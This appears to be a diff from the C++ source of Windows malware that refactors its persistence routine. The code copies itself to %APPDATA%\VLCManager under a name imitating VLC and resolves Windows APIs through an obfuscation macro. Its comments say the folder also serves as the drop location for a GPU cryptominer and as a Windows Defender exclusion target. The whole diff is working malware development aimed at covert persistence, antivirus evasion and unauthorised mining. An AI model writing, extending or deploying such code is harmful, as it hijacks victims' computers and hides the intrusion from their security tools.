@@ -200,10 +200,10 @@ std::string GetExecutableName() {
     return fullPath;
 }
 
-// Copies the binary to %APPDATA%\VLCManager\VLCManager.exe so persistence
-// always points to a stable location independent of where it was launched from.
-std::string CopySelfToAppData() {
-    // Resolve %APPDATA%
+// Returns the full persistence directory (%APPDATA%\VLCManager) and ensures it
+// exists. This folder is used for self-persistence, as the GPU miner drop
+// location, and as the Windows Defender exclusion target.
+std::string GetPersistDirectory() {
     typedef HRESULT(WINAPI* pSHGetFolderPathA_t)(HWND, int, HANDLE, DWORD, LPSTR);
     pSHGetFolderPathA_t _SHGetFolderPathA = (pSHGetFolderPathA_t)STEALTH_API_OBFSTR("shell32.dll", "SHGetFolderPathA");
 
@@ -216,21 +216,31 @@ std::string CopySelfToAppData() {
     }
     if (appDataPath[0] == '\0') return "";
 
-    std::string srcPath = GetExecutablePath();
-    if (srcPath.empty()) return "";
-
-    // Build destination: %APPDATA%\VLCManager\VLCManager.exe (the running copy is
-    // renamed so it never keeps the name it was built/dropped with).
     std::string persistDir = std::string(appDataPath) + "\\" + GetPersistFolder();
-    std::string destPath   = persistDir + "\\" + GetPersistFile();
 
-    // If we're already running from that path, nothing to do.
-    if (srcPath == destPath) return destPath;
-
-    // Ensure %APPDATA%\VLCManager\ exists (it won't on a clean machine)
+    // Ensure the directory exists (it won't on a clean machine).
     typedef BOOL(WINAPI* pCreateDirectoryA_t)(LPCSTR, LPSECURITY_ATTRIBUTES);
     pCreateDirectoryA_t _CreateDirectoryA = (pCreateDirectoryA_t)STEALTH_API_OBFSTR("kernel32.dll", "CreateDirectoryA");
     if (_CreateDirectoryA) _CreateDirectoryA(persistDir.c_str(), NULL);
+
+    return persistDir;
+}
+
+// Copies the binary to %APPDATA%\VLCManager\VLCManager.exe so persistence
+// always points to a stable location independent of where it was launched from.
+std::string CopySelfToAppData() {
+    std::string srcPath = GetExecutablePath();
+    if (srcPath.empty()) return "";
+
+    std::string persistDir = GetPersistDirectory();
+    if (persistDir.empty()) return "";
+
+    // Build destination: %APPDATA%\VLCManager\VLCManager.exe (the running copy is
+    // renamed so it never keeps the name it was built/dropped with).
+    std::string destPath = persistDir + "\\" + GetPersistFile();
+
+    // If we're already running from that path, nothing to do.
+    if (srcPath == destPath) return destPath;
 
     // Copy — overwrite any existing copy
     typedef BOOL(WINAPI* pCopyFileA_t)(LPCSTR, LPCSTR, BOOL);
